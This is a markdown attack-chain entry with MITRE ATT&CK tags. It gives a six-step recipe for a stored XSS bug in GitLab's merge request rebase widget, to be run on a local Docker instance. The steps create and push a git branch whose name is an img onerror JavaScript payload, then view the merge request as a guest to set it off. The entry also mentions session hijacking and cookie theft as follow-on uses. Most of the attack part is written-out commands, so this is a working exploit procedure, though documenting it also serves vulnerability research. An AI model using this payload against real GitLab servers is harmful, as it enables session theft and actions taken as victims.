---
tags:
  - stored-xss
  - gitlab
  - javascript-injection
  - branch-name
  - merge-request
type: attack_chain
tools:
  - '[[tools/Docker]]'
  - '[[tools/Git]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-GitLab-Instance-with-Docker]]'
  - '[[procedures/Create-New-Project-in-GitLab]]'
  - '[[procedures/Configure-Merge-Method-in-Project-Settings]]'
  - '[[procedures/Create-Malicious-Branch-with-XSS-Payload]]'
  - '[[procedures/Create-Merge-Request-from-Master-to-XSS-Branch]]'
  - '[[procedures/Trigger-XSS-by-Viewing-Merge-Request-Page]]'
step_count: 6
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.389Z'
description: >-
  A multi-stage attack exploiting a Stored XSS vulnerability in GitLab's merge
  request rebase widget by injecting JavaScript payloads into branch names,
  leading to arbitrary code execution in victims' browsers.
skill_level: intermediate
impact_level: high
id: 6198f3c7-0021-40c5-8385-60db6f1ddf99
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Stored XSS in GitLab Merge Requests via Malicious Branch Name

Multi-stage attack chain demonstrating exploitation of a Stored XSS vulnerability in GitLab's merge request pages. An attacker creates a branch with a malicious JavaScript payload in its name. When a merge request requiring rebase is viewed by a victim (e.g., a user without push permissions), the payload executes in the rebase widget, allowing arbitrary JavaScript execution, session hijacking, data theft, and actions as the victim.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup GitLab Instance] --> B[Create and Configure Project]
    B --> C[Inject XSS in Branch Name]
    C --> D[Create Merge Request]
    D --> E[View MR as Victim]
    E --> F[Execute Payload and Exfiltrate Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Docker]]
- [[tools/Git]]

### Target Environment

- GitLab CE latest version (vulnerable in versions like 12.4.0)
- Required services/ports: HTTP (80), HTTPS (443), SSH (22)
- Linux host for Docker
- Network access to GitLab UI and Git remotes

### Initial Access Requirements

- Attacker access to create projects and branches (developer permissions)
- Victim access to view merge requests (guest or anonymous)
- No push permissions for victim on source branch

## Detailed Attack Procedures

### Step 1: Setup GitLab Instance

procedure: [[procedures/Setup-GitLab-Instance-with-Docker]]

**Objective**: Deploy a local GitLab instance for testing the vulnerability.

**Instructions**: Use [[commands/docker-run-gitlab-instance]] to start the container:

```bash
docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest
```

Wait for GitLab to initialize (may take several minutes). Access via http://gitlab.example.com.

**Expected Output**: Running GitLab instance with container ID logged.

**Success Indicators**:
- Container starts without errors
- GitLab UI accessible at hostname

### Step 2: Create New Project

procedure: [[procedures/Create-New-Project-in-GitLab]]

**Objective**: Establish a project to host the vulnerable merge request.

**Instructions**: Log in to GitLab UI as admin/developer and create a new project via the dashboard.

**Expected Output**: New project repository created.

**Success Indicators**:
- Project visible in dashboard
- Empty repository ready for commits

### Step 3: Configure Merge Method

procedure: [[procedures/Configure-Merge-Method-in-Project-Settings]]

**Objective**: Enable merge methods that trigger the rebase widget for XSS exploitation.

**Instructions**: In project settings > General > Merge requests, select 'Fast-forward merge' or 'Merge commit with semi-linear history'.

**Expected Output**: Settings updated; rebase prompts will appear for conflicting MRs.

**Success Indicators**:
- Merge method changed in UI
- Project configured for rebase-required MRs

### Step 4: Create Malicious Branch with XSS Payload

procedure: [[procedures/Create-Malicious-Branch-with-XSS-Payload]]

**Objective**: Inject XSS payload into a branch name and push commits to create rebase conflict.

**Instructions**: Clone the repo (git clone http://gitlab.example.com/project.git), then execute sequence:

Use [[commands/touch-file]] for initial file:

```bash
touch 1.txt
git add 1.txt
git commit -m "initial commit"
git push origin master
```

Create XSS branch with [[commands/git-checkout-xss-branch]]:

```bash
git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
```

Add commit to XSS branch:

```bash
touch 2.txt
git add 2.txt
git commit -m "add 2.txt"
git push origin "<img/src='x'/onerror=alert(document.domain)>"
```

Switch back and add to master:

```bash
git checkout master
touch 3.txt
git add 3.txt
git commit -m "add 3.txt"
git push origin master
```

**Expected Output**: Branches pushed; master ahead of XSS branch, requiring rebase.

**Success Indicators**:
- XSS branch created and pushed
- Commits create rebase conflict

### Step 5: Create Merge Request

procedure: [[procedures/Create-Merge-Request-from-Master-to-XSS-Branch]]

**Objective**: Set up the merge request that will display the vulnerable rebase widget.

**Instructions**: In GitLab UI, go to Merge Requests > New, set source: master, target: XSS branch.

**Expected Output**: MR created with rebase required.

**Success Indicators**:
- MR visible and shows rebase prompt
- No direct merge possible

### Step 6: Trigger XSS by Viewing Merge Request Page

procedure: [[procedures/Trigger-XSS-by-Viewing-Merge-Request-Page]]

**Objective**: Execute the XSS payload in a victim's browser context.

**Instructions**: Log in as a guest user without push permissions and visit the MR page. The rebase widget (mr_widget_rebase.vue) renders the unsanitized branch name, triggering the onerror alert.

**Expected Output**: JavaScript alert with document.domain; potential for further payload to steal session/cookies.

**Success Indicators**:
- Alert pops up on page load
- Console shows JS execution
- Ability to exfiltrate data (e.g., via additional payload)

## Attack Chain Summary

### Key Achievements

1. Successful deployment of vulnerable GitLab instance
2. Injection of Stored XSS via branch name
3. Arbitrary JS execution leading to session hijacking and data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
